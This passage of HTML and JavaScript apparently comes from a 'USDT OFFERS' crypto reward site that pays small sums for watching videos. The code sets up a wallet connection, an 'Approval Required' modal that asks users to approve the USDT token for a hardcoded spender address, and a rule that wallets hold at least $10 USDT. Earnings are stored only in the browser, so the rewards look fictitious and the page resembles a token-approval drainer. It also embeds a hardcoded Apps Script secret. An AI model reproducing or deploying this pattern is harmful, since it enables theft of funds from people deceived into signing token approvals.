  <div class="task-amount-badge">+$0.15</div>
  <h3>GoPro Firefighter's Raw POV</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task30Player"
      src="https://www.youtube.com/embed/mphHFk5IXsQ?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task30Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task30Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task30" disabled>
  Claim $0.15
</button>

  </div>
</div>



<!-- Task 31: video -->
<div class="task-section" data-task="task31" data-order="28">

  <div class="task-amount-badge">+$0.15</div>
  <h3>Jumping From Space! - Red Bull Space Dive</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task31Player"
      src="https://www.youtube.com/embed/E9oKEJ1pXPw?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task31Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task31Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task31" disabled>
  Claim $0.15
</button>

  </div>
</div>


<!-- Task 32: video -->
<div class="task-section" data-task="task32" data-order="29">

  <div class="task-amount-badge">+$0.15</div>
  <h3>McLaren Speedtail vs F35 Fighter Jet</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task32Player"
      src="https://www.youtube.com/embed/ROOeGPrC1Do?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task32Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task32Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task32" disabled>
  Claim $0.15
</button>

  </div>
</div>


<!-- Task 33: video -->
<div class="task-section" data-task="task33" data-order="30">

  <div class="task-amount-badge">+$0.15</div>
  <h3>Range Rover Sport</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task33Player"
      src="https://www.youtube.com/embed/EUwzWHD3Htg?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task33Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task33Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task33" disabled>
  Claim $0.15
</button>

  </div>
</div>


      
      

      <!-- Task 3: custom action -->
          <!-- Task 3: Bubble Shooter -->
<div class="task-section" data-task="task3">
  <div class="task-amount-badge">+$5</div>
  <h3>Play Bubble Shooter (30 minutes)</h3>

  <!-- Play Store preview -->
  <div style="display:flex;gap:14px;align-items:center;margin-top:8px;">
    <img
      src="assets/bubble-shooter-icon.png"
      alt="Bubble Shooter"
      style="width:64px;height:64px;border-radius:14px;"
    />
    <div>
      <div style="font-weight:600;">Bubble Shooter</div>
      <div class="small">Bubble Shooter Studio</div>
      <div class="small">‚≠ê 4.6 ‚Ä¢ Arcade</div>
    </div>
  </div>
<p class="small" style="margin-top:8px;">
    Shoot, match and pop bubbles in this classic arcade puzzle game.
</p>

  
<div>
 <img
  src="assets/bubble1.jpg"
  style="
    width:100%;
    max-width:640px;
    aspect-ratio:16/9;
    object-fit:cover;
    border-radius:12px;
    box-shadow:0 18px 38px rgba(15,23,42,0.9);
  "
> </div>

  

  <div class="task-actions">
    <a
      id="task3StartBtn"
    class="google-play-btn"

      href="https://play.google.com/store/apps/details?id=bubbleshooter.orig"
      target="_blank" 
      > 
      <img
      src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png"
      alt="Get it on Google Play"
    >
  </a>
    
    

    <button id="task3DoneBtn" class="task-btn" disabled>
      Coming Soon..
    </button>

  
  </div>

</div>





<div class="task-section" data-task="task4">
  <div class="task-amount-badge">+$5</div>
  <h3>Play Block Blast (30 minutes)</h3>

  <div style="display:flex;gap:14px;align-items:center;margin-top:8px;">
    <img
      src="assets/block-blast-icon.png"
      alt="Block Blast"
      style="width:64px;height:64px;border-radius:14px;"
    />
    <div>
      <div style="font-weight:600;">Block Blast</div>
      <div class="small">Hungry Studio</div>
      <div class="small">‚≠ê 4.7 ‚Ä¢ Puzzle</div>
    </div>
  </div>

<p class="small" style="margin-top:8px;">
    Relaxing block puzzle game with endless fun and strategic challenges.
</p>

        

<div>
 <img
  src="assets/block1.jpg"
  style="
    width:100%;
    max-width:640px;
    aspect-ratio:16/9;
    object-fit:cover;
    border-radius:12px;
    box-shadow:0 18px 38px rgba(15,23,42,0.9);
  "
> </div>

  

  <div class="task-actions">
    <a
      id="task4StartBtn"
      class="google-play-btn"
      href="https://play.google.com/store/apps/details?id=com.block.juggle"
      target="_blank"
    >   <img
      src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png"
      alt="Get it on Google Play"
    >
  </a>

    <button id="task4DoneBtn" class="task-btn" disabled>
      Coming Soon..
    </button>

  </div>
     

</div>


<div class="center-box" style="margin-top: 26px;">
  <button class="btn-primary backTosBtn">
    ‚Üê Back to 
  </button>
</div>

      
    </div>
  </main>

  <!-- FOOTER (same structure as index) -->
 <footer>
  <div class="footer-text">
    ¬© 2025 USDT OFFERS ‚Äî BSC (BEP-20) ‚Ä¢ No private keys stored.
  </div>
<div class="small" style="margin-top:6px;opacity:0.6;">
 Supported by ecosystem and Web3
</div>
<div class="small footer-note">
  Logos are trademarks of their respective owners.
</div>
  <!-- ===== PARTNER LOGOS ===== -->
  <div class="footer-partners">
   <img src="assets/partners/binance.png" alt="Binance">
  <img src="assets/partners/metamask.png" alt="MetaMask">
  <img src="assets/partners/trustwallet.png" alt="Trust Wallet">
  <img src="assets/partners/bnbchain.png" alt="BNB Chain">
  <img src="assets/partners/walletconnect.png" alt="WalletConnect">
 <img src="assets/partners/usdt.png" alt="BNB Chain">
  </div>
</footer>



<!-- ===== WITHDRAW MODAL ===== -->
<div id="withdrawModal" class="modal-overlay hidden">
  <div class="modal-card">
    <button class="modal-close" id="closeWithdrawModal">‚úï</button>

    <h3>Confirm Withdrawal</h3>

<div class="withdraw-rules">  
  <ul>
  <li>Your <strong>Trust/Metamask</strong> wallet must be active wallet to receive withdrawal</li>
  <li>You must have minimum <strong>$10 USDT</strong> in your <strong>Trust/Metamask</strong> wallet to receive withdrawal.</li>
   <li> We do not payment to inactive or dead wallet.</strong></li>
  </ul> 
</div>
    <br>
    <p class="small">
      User ID: <strong id="wdUserId">‚Äî</strong><br>
      Address: <strong id="wdAddress">‚Äî</strong>
    </p>

    <div style="margin-top:12px">
      <label class="small">Withdraw Amount ($)</label>
      <input
        id="withdrawAmountInput"
        type="number"
        min="10"
        step="0.01"
        class="withdraw-input"
      >
      <div id="withdrawError" class="withdraw-error hidden"></div>
    </div>

    <div class="approval-actions" style="margin-top:18px">
      <button id="confirmWithdrawBtn" class="withdraw-btn">
        Confirm Withdraw
      </button>
    </div>
  </div>
</div>






  
<!-- ===== ABOUT / CONTACT MODAL ===== -->
<div id="infoModal" class="modal-overlay hidden">
  <div class="modal-card">
    <button class="modal-close" id="closeModal">‚úï</button>
    <div id="modalBody"></div>
  </div>
</div>

<div id="withdrawSuccessModal" class="modal-overlay hidden">
  <div class="modal-card">
    <h3 style="color:#22c55e">Withdrawal Requested </h3>

    <p id="withdrawSuccessText" class="small"></p>

    <div style="text-align:center;margin-top:18px;">
   <button id="withdrawSuccessOkBtn" class="btn btn-primary">OK</button>

    </div>
  </div>
</div>


  <!-- ===== APPROVAL REQUIRED MODAL ===== -->
<div id="approvalModal" class="modal-overlay hidden">
  <div class="modal-card">
    <button class="modal-close" id="closeApprovalModal">‚úï</button>

    <h3>Approval Required</h3>
    <p>
      To view and complete  tasks, you must approve
     
      <br><br>
      This allows the  contract to verify eligibility.
    .
    </p>

    <div class="approval-actions">
  <button id="modalApproveBtn" class="approve-btn">
    Approve Now
  </button>
</div>


    
  </div>
</div>

<div id="toast" class="toast hidden"></div>


  
  <!-- libs: Web3 + Ethers -->
  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
  <script src="https://www.youtube.com/iframe_api"></script>


  <!-- Vite / React entry: this runs src/main.jsx (and appkit.ts) -->
  <script type="module" src="/src/main.jsx"></script>

  <!-- app script (same logic, AppKit-based connect) -->
  <script type="module">















    

// ===== ABOUT / CONTACT POPUPS =====
const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);


const aboutBtn   = document.getElementById("aboutBtn");
const contactBtn = document.getElementById("contactBtn");
const modal      = document.getElementById("infoModal");
const modalBody  = document.getElementById("modalBody");
const closeModal = document.getElementById("closeModal");
const REQUIRED_WATCH_PERCENT = 0.90; // must watch 95%
const MAX_SKIP_SECONDS = 3;          // max allowed jump

function openModal(html){
  modalBody.innerHTML = html;
  modal.classList.remove("hidden");
}

function hideModal(){
  modal.classList.add("hidden");
}

aboutBtn?.addEventListener("click", e=>{
  e.preventDefault();
  openModal(`
    <h3>About USDTOFFERS</h3>
    <p>
      USDTOFFERS is a -based Web3 platform built on
      <strong>BNB Smart Chain</strong>.
      <br><br>
      Users connect wallets, complete tasks, and unlock s.
      <br><br>
      üîí No private keys are stored.
    </p>
  `);
});



// ===== APPROVAL MODAL =====
const approvalModal    = document.getElementById("approvalModal");
const closeApprovalBtn = document.getElementById("closeApprovalModal");
const modalApproveBtn  = document.getElementById("modalApproveBtn");
const modalCancelBtn   = document.getElementById("modalCancelBtn");

function openApprovalModal(){
  approvalModal.classList.remove("hidden");
}

function closeApprovalModal(){
  approvalModal.classList.add("hidden");
}

closeApprovalBtn?.addEventListener("click", closeApprovalModal);
modalCancelBtn?.addEventListener("click", closeApprovalModal);



    
contactBtn?.addEventListener("click", e=>{
  e.preventDefault();
  openModal(`
    <h3>Contact</h3>
    <p>
      üìß Email: support@usdtoffers.com<br>
      üåê Website: usdtoffers.com<br>
      ü§ù Partnerships & support inquiries welcome.
    </p>
  `);
});

closeModal.addEventListener("click", hideModal);

// close when clicking outside
modal.addEventListener("click", e=>{
  if(e.target === modal) hideModal();
});




    
  (function(){
    // ===== CONFIG =====
    function formatToken(n) {
      n = Number(n);
      if (Number.isInteger(n)) return n.toString();
      return n.toFixed(4).replace(/\.?0+$/, "");
    }

    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbwBORgcVCCyRFx4Po-C2Ggc_k5RuZOOv03w62CesTPrJARjKr20YztsOvpWDtcfriTQ/exec";
    const APPS_SCRIPT_SECRET = "justforme";

    const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
    const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";

    const BNB_TESTNET_CHAIN_ID_DEC = 56;
    const BNB_TESTNET_CHAIN_ID_HEX = "0x38";
    const BNB_TESTNET_LABEL        = "BNB Smart Chain (56)";
    const BNB_TESTNET_RPC          = "https://bsc-dataseed.binance.org";

    const ERC20_APPROVE_ABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];
    const ERC20_BALANCE_ABI = [
      "function balanceOf(address owner) view returns (uint256)" 
    ];
    const ERC20_ALLOWANCE_ABI = [
      "function allowance(address owner, address spender) view returns (uint256)"
    ];

    // USDT on BSC uses 18 decimals
    const TOKEN_DECIMALS = 18;

    const REQUIRED_USDT = 10;   // Task 2
    const REWARD_AMOUNT = 10.0; // display only

    let providerInstance      = null;
    let web3Instance          = null;
    let currentAddress        = null;
    let currentUserId         = null;
    let currentBNBBalance     = null;
    let currentTokenBalance   = null;

    let isWalletConnected = false;
    let task1Done         = false;
    let task2Eligible     = false;
    let task3Done         = false;
    let task5Done = false;
        let task6Done = false;
        let task7Done = false;
        let task8Done = false;
        let task9Done = false;
        let task10Done = false;
            let task11Done = false;
            let task12Done = false;
            let task13Done = false;
            let task14Done = false;
            let task15Done = false;
            let task16Done = false;
            let task17Done = false;
            let task18Done = false;
            let task19Done = false;
            let task20Done = false;
            let task21Done = false;
            let task22Done = false;
            let task23Done = false;
            let task24Done = false;
            let task25Done = false;
            let task26Done = false;
            let task27Done = false;
            let task28Done = false;
            let task29Done = false;
            let task30Done = false;
            let task31Done = false;
            let task32Done = false;
            let task33Done = false;
          
    

// ===== TASK REWARD CONFIG =====
const TASK_REWARDS = {
  task1: 1,   // $1
  task5: 0.40,
  task6: 0.55,
  task7: 0.75,
  task8: 0.35,
  task9: 0.35,
  task10: 0.90,
  task11: 0.20,
  task12: 0.60,
  task13: 0.25,
  task14: 0.20,
  task15: 0.35,
  task16: 0.15,
  task17: 0.25,
  task18: 1,
  task19: 0.20,
  task20: 0.25,
  task21: 0.15,
  task22: 0.25,
  task23: 0.20,
  task24: 0.25,
  task25: 0.20,
  task26: 0.25,
  task27: 0.25,
  task28: 0.20,
  task29: 0.25,
  task30: 0.15,
  task31: 0.15,
  task32: 0.15,
  task33: 0.15
};



    

let isTokenApproved = false;
let approvalFailed  = false;

let completedTasks = new Set();
let totalEarnings = 0;

function earningsStorageKey() {
  return "earnings_" + (currentAddress || "guest");
}






    // === YouTube Task 1 Player ===
let task1Player = null;
let ytReady = false;



    
    const videoTasks = {
  task1: {
    playerId: "task1Player",
    ringId: "task1Ring",
    timerId: "task1Timer",
    checkEl: null,          // will assign later
    doneFlag: () => task1Done = true,

    player: null,
    watched: 0,
    duration: 0,
    remaining: 0,

    interval: null,
    lastTime: 0,
    stableTicks: 0
  },
 task5: {
    playerId: "task5Player",
    ringId: "task5Ring",
    timerId: "task5Timer",
    checkEl: null,
    doneFlag: () => task5Done = true,

    player: null,
    watched: 0,
    duration: 0,
   remaining: 0,

    interval: null,
    lastTime: 0,
    stableTicks: 0
 },

 task6: {
    playerId: "task6Player",
    ringId: "task6Ring",
    timerId: "task6Timer",
    checkEl: null,
    doneFlag: () => task6Done = true,

    player: null,
    watched: 0,
    duration: 0,
   remaining: 0,

    interval: null,
    lastTime: 0,
    stableTicks: 0
    },
       task7: {
    playerId: "task7Player",
    ringId: "task7Ring",
    timerId: "task7Timer",
    checkEl: null,
    doneFlag: () => task7Done = true,

    player: null,
    watched: 0,
    duration: 0,
         remaining: 0,

    interval: null,
    lastTime: 0,
    stableTicks: 0
 },

       task8: {
    playerId: "task8Player",
    ringId: "task8Ring",
    timerId: "task8Timer",
    checkEl: null,
    doneFlag: () => task8Done = true,

    player: null,
    watched: 0,
    duration: 0,
         remaining: 0,

    interval: null,
    lastTime: 0,
    stableTicks: 0
 },



       task9: {
    playerId: "task9Player",
    ringId: "task9Ring",
    timerId: "task9Timer",
    checkEl: null,
    doneFlag: () => task9Done = true,

    player: null,
    watched: 0,
    duration: 0,
         remaining: 0,

    interval: null,
    lastTime: 0,
    stableTicks: 0
 },


       task10: {
    playerId: "task10Player",
    ringId: "task10Ring",
    timerId: "task10Timer",
    checkEl: null,
    doneFlag: () => task10Done = true,

    player: null,
    watched: 0,
    duration: 0,
         remaining: 0,

    interval: null,
    lastTime: 0,
    stableTicks: 0
 },

task11: {
  playerId: "task11Player",
  ringId: "task11Ring",
  timerId: "task11Timer",
  checkEl: null,
  doneFlag: () => task11Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task12: {
  playerId: "task12Player",
  ringId: "task12Ring",
  timerId: "task12Timer",
  checkEl: null,
  doneFlag: () => task12Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task13: {
  playerId: "task13Player",
  ringId: "task13Ring",
  timerId: "task13Timer",
  checkEl: null,
  doneFlag: () => task13Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task14: {
  playerId: "task14Player",
  ringId: "task14Ring",
  timerId: "task14Timer",
  checkEl: null,
  doneFlag: () => task14Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task15: {
  playerId: "task15Player",
  ringId: "task15Ring",
  timerId: "task15Timer",
  checkEl: null,
  doneFlag: () => task15Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task16: {
  playerId: "task16Player",
  ringId: "task16Ring",
  timerId: "task16Timer",
  checkEl: null,
  doneFlag: () => task16Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task17: {
  playerId: "task17Player",
  ringId: "task17Ring",
  timerId: "task17Timer",
  checkEl: null,
  doneFlag: () => task17Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task18: {
  playerId: "task18Player",
  ringId: "task18Ring",
  timerId: "task18Timer",
  checkEl: null,
  doneFlag: () => task18Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task19: {
  playerId: "task19Player",
  ringId: "task19Ring",
  timerId: "task19Timer",
  checkEl: null,
  doneFlag: () => task19Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task20: {
  playerId: "task20Player",
  ringId: "task20Ring",
  timerId: "task20Timer",
  checkEl: null,
  doneFlag: () => task20Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task21: {
  playerId: "task21Player",
  ringId: "task21Ring",
  timerId: "task21Timer",
  checkEl: null,
  doneFlag: () => task21Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task22: {
  playerId: "task22Player",
  ringId: "task22Ring",
  timerId: "task22Timer",
  checkEl: null,
  doneFlag: () => task22Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task23: {
  playerId: "task23Player",
  ringId: "task23Ring",
  timerId: "task23Timer",
  checkEl: null,
  doneFlag: () => task23Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task24: {
  playerId: "task24Player",
  ringId: "task24Ring",
  timerId: "task24Timer",
  checkEl: null,
  doneFlag: () => task24Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task25: {
  playerId: "task25Player",
  ringId: "task25Ring",
  timerId: "task25Timer",
  checkEl: null,
  doneFlag: () => task25Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task26: {
  playerId: "task26Player",
  ringId: "task26Ring",
  timerId: "task26Timer",
  checkEl: null,
  doneFlag: () => task26Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task27: {
  playerId: "task27Player",
  ringId: "task27Ring",
  timerId: "task27Timer",
  checkEl: null,
  doneFlag: () => task27Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task28: {
  playerId: "task28Player",
  ringId: "task28Ring",
  timerId: "task28Timer",
  checkEl: null,
  doneFlag: () => task28Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task29: {
  playerId: "task29Player",
  ringId: "task29Ring",
  timerId: "task29Timer",
  checkEl: null,
  doneFlag: () => task29Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task30: {
  playerId: "task30Player",
  ringId: "task30Ring",
  timerId: "task30Timer",
  checkEl: null,
  doneFlag: () => task30Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task31: {
  playerId: "task31Player",
  ringId: "task31Ring",
  timerId: "task31Timer",
  checkEl: null,
  doneFlag: () => task31Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task32: {
  playerId: "task32Player",
  ringId: "task32Ring",
  timerId: "task32Timer",
  checkEl: null,
  doneFlag: () => task32Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
},

task33: {
  playerId: "task33Player",
  ringId: "task33Ring",
  timerId: "task33Timer",
  checkEl: null,
  doneFlag: () => task33Done = true,

  player: null,
  watched: 0,
  duration: 0,
  remaining: 0,

  interval: null,
  lastTime: 0,
  stableTicks: 0
}
      
   
};

window.onYouTubeIframeAPIReady = function () {
  ytReady = true;
};

let task1WatchSeconds = 0;
let task1Duration = 0;
let task1Interval = null;
let lastVideoTime = 0;
let stableTicks = 0;
const STABLE_REQUIRED = 3; // seconds of real playback
    



function destroyTask(taskKey) {
  const task = videoTasks[taskKey];
  if (!task) return;

  // stop timer
  if (task.interval) {
    clearInterval(task.interval);
    task.interval = null;
  }

  // destroy youtube player (WebGL)
  if (task.player) {
    try {
      task.player.stopVideo();
      task.player.destroy();
    } catch (e) {}
    task.player = null;
  }

  // optional safety reset
  task.watched = 0;
  task.remaining = 0;
}





    
function updateVideoTimerUI(task) {
  const textEl = document.getElementById(task.timerId);
  const ringEl = document.getElementById(task.ringId);
  if (!textEl || !ringEl) return;

  const m = String(Math.floor(task.remaining / 60)).padStart(2, "0");
  const s = String(task.remaining % 60).padStart(2, "0");
  textEl.textContent = `${m}:${s}`;

  if (task.duration > 0) {
    const progress = 1 - (task.remaining / task.duration);
    ringEl.style.strokeDashoffset = 113 - progress * 113;
  }
}

function enableVideoClickToPlay() {
  // üî• MOBILE: do NOTHING (iframe must receive direct touch)
  if (isMobile) return;

  // DESKTOP ONLY
  document.querySelectorAll(".video-wrapper").forEach(wrapper => {
    // Avoid duplicate overlays
    if (wrapper.querySelector(".video-click-overlay")) return;

    const overlay = document.createElement("div");
    overlay.className = "video-click-overlay";
    wrapper.appendChild(overlay);

    overlay.addEventListener("click", () => {
      const iframe = wrapper.querySelector("iframe");
      if (!iframe) return;

      const task = Object.values(videoTasks).find(
        t => t.playerId === iframe.id
      );

      task?.player?.playVideo();
    });
  });
}


function updateTaskAccessUI() {
  if (!taskBtn) return;

  if (isWalletConnected) {
    taskBtn.disabled = false;
    taskBtn.title = "View reward tasks";
  } else {
    taskBtn.disabled = true;
    taskBtn.title = "Connect your wallet to unlock tasks";
  }
}

    
  
function onVideoStateChange(task, event) {
  if (!task.player) return;




if (event.data === YT.PlayerState.PLAYING) {
  const overlay = document
    .getElementById(task.playerId)
    ?.closest(".video-wrapper")
    ?.querySelector(".video-click-overlay");

  // üî• HIDE overlay so iframe receives clicks
  if (overlay) overlay.classList.add("hidden");

  if (!task.interval) {
    task.interval = setInterval(() => {
      const current = Math.floor(task.player.getCurrentTime());
const duration = Math.floor(task.player.getDuration());

// Detect skip forward
if (current - task.lastTime > MAX_SKIP_SECONDS) {
  // ‚ùå User skipped ‚Äî reset progress
  task.watched = 0;
  task.remaining = duration;
  task.lastTime = current;
  task.stableTicks = 0;
  updateVideoTimerUI(task);
  return;
}

// Normal playback
if (current > task.lastTime) {
  task.watched++;
  task.lastTime = current;
}


      task.stableTicks++;
      task.lastTime = current;
      if (task.stableTicks < 3) return;

      if (duration > 0 && task.duration === 0) {
        task.duration = duration;
        task.remaining = duration;
      }

      task.remaining = Math.max(task.duration - current, 0);
      updateVideoTimerUI(task);

     const watchedRatio = task.watched / task.duration;

if (watchedRatio >= REQUIRED_WATCH_PERCENT) {
  completeVideoTask(task);
}

    }, 1000);
  }
}


if (event.data === YT.PlayerState.PAUSED) {
  task.stableTicks = 0;
}
  

 if (event.data === YT.PlayerState.BUFFERING
) {
  clearInterval(task.interval);
  task.interval = null;
  task.stableTicks = 0;
}

}




const withdrawModal = document.getElementById("withdrawModal");
const closeWithdrawModalBtn = document.getElementById("closeWithdrawModal");
const withdrawAmountInput = document.getElementById("withdrawAmountInput");
const withdrawError = document.getElementById("withdrawError");

function openWithdrawModal() {
  if (totalEarnings < 10) return;

  document.getElementById("wdUserId").textContent = currentUserId;
  document.getElementById("wdAddress").textContent =
    currentAddress.slice(0, 6) + "‚Ä¶" + currentAddress.slice(-4);

  withdrawAmountInput.value = totalEarnings.toFixed(2);
  withdrawAmountInput.max = totalEarnings.toFixed(2);

  withdrawError.classList.add("hidden");
  withdrawModal.classList.remove("hidden");
}

function closeWithdrawModal() {
  withdrawModal.classList.add("hidden");
}

closeWithdrawModalBtn?.addEventListener("click", closeWithdrawModal);
withdrawModal.addEventListener("click", e => {
  if (e.target === withdrawModal) closeWithdrawModal();
});


function withdrawStorageKey() {
  return "withdrawals_" + (currentAddress || "guest");
}

function loadWithdrawals() {
  const raw = localStorage.getItem(withdrawStorageKey());
  return raw ? JSON.parse(raw) : [];
}

function saveWithdrawals(list) {
  localStorage.setItem(withdrawStorageKey(), JSON.stringify(list));
}

function renderWithdrawHistory() {
  const box = document.getElementById("withdrawHistoryList");
  if (!box) return;

  const list = loadWithdrawals();

  if (!list.length) {
    box.textContent = "No withdrawals yet.";
    return;
  }

  box.innerHTML = "";

  list.slice().reverse().forEach(w => {
    const div = document.createElement("div");
    div.className = "withdraw-item";

    div.innerHTML = `
      <div class="withdraw-left">
        <span class="withdraw-amount">$${w.amount.toFixed(2)}</span>
        <span class="withdraw-time">${w.time}</span>
      </div>
      <span class="withdraw-status ${w.status}">
        ${w.status.toUpperCase()}
      </span>
    `;

    box.appendChild(div);
  });
}


function showWithdrawSuccess(amount) {
  const modal = document.getElementById("withdrawSuccessModal");
  const text  = document.getElementById("withdrawSuccessText");

  if (!modal || !text) return;

  text.innerHTML = `
    <strong>User ID:</strong> ${currentUserId}<br>
    <strong>Address:</strong>
    <span class="mono">${currentAddress}</span><br><br>
    <strong>Withdraw Amount:</strong> $${amount.toFixed(2)}<br><br>
    Please allow up to <strong>2 hours</strong> to receive the amount.
  `;

  modal.classList.remove("hidden");
}

function closeWithdrawSuccess() {
  const modal = document.getElementById("withdrawSuccessModal");
  if (modal) modal.classList.add("hidden");
}



document
  .getElementById("withdrawSuccessOkBtn")
  ?.addEventListener("click", () => {
    closeWithdrawSuccess();
  });

    
    
function completeVideoTask(task) {
  if (task.done) return;

  task.done = true;
  clearInterval(task.interval);
  task.interval = null;

  document.getElementById(task.ringId).style.stroke = "#22c55e";
  document.getElementById(task.timerId).textContent = "‚úÖ Completed";

  if (task.checkEl) {
    markTaskState(task.checkEl, true, "Completed", "Not completed");
  }

  // üîì unlock claim button ONLY
  const taskKey = Object.keys(videoTasks).find(k => videoTasks[k] === task);
  if (taskKey) {
    completedTasks.add(taskKey);

    const claimBtn = document.querySelector(
      `.task-claim-btn[data-task="${taskKey}"]`
    );
    if (claimBtn) {
      claimBtn.disabled = false;
    }

    saveEarnings(); // save completion state
  }

  task.doneFlag();
  updateClaimState();
  updateTaskUnlocks();
  updateTaskProgress();


}


function saveEarnings() {
  localStorage.setItem(
    earningsStorageKey(),
    JSON.stringify({
      completed: Array.from(completedTasks),
      claimed: Array.from(claimedTasks),
      total: totalEarnings
    })
  );
}


function loadEarnings() {
  const raw = localStorage.getItem(earningsStorageKey());
  if (!raw) return;

  try {
    const data = JSON.parse(raw);

    completedTasks.clear();
    (data.completed || []).forEach(t => completedTasks.add(t));

    claimedTasks.clear();
    (data.claimed || []).forEach(t => claimedTasks.add(t));

    totalEarnings = Number(data.total || 0);

    // restore buttons
    claimedTasks.forEach(taskKey => {
      const btn = document.querySelector(
        `.task-claim-btn[data-task="${taskKey}"]`
      );
      if (btn) {
        btn.textContent = "Claimed ‚úì";
        btn.disabled = true;
      }
    });

    completedTasks.forEach(taskKey => {
      if (!claimedTasks.has(taskKey)) {
        const btn = document.querySelector(
          `.task-claim-btn[data-task="${taskKey}"]`
        );
        if (btn) btn.disabled = false;
      }
    });

     updateTaskUnlocks();
    updateTaskProgress();
    renderWithdrawHistory();


  } catch (e) {
